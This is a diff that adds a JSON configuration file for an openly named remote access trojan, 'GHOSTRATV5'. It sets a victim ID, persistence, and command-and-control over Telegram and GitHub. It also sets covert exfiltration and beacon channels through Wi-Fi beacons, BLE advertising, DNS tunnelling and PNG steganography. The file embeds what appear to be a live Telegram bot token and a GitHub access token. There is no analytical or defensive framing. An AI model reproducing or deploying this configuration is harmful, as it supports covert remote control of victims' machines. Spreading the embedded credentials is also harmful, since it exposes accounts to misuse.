@@ -1,0 +1,33 @@
+{
+  "victim_id": "victim-01",
+  "heartbeat_interval": 60,
+  "crypto_key": "GHOSTRATV5",
+  "channels": ["telegram", "github_issues", "github_api"],
+  "telegram": {
+    "bot_token": "915524:AAEoIfzYK7ql91WwfbviqMdzY1efv00LUlo",
+    "chat_id": 8704616041
+  },
+  "github": {
+    "repo_owner": "giorgipirveli",
+    "repo_name": "ghostrat-v5",
+    "token": "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",
+    "file_path": "commands.json"
+  },
+  "persistence": true,
+  "wifi_beacon": {
+    "prefix": "GHOST-",
+    "interval_secs": 5
+  },
+  "ble_adv": {
+    "interval_secs": 3,
+    "adv_data": "GHOST"
+  },
+  "dns_tunnel": {
+    "domain": "ghost.example.com",
+    "interval_secs": 10
+  },
+  "png_stego": {
+    "png_path": "ghost.png",
+    "interval_secs": 30
+  }
+}
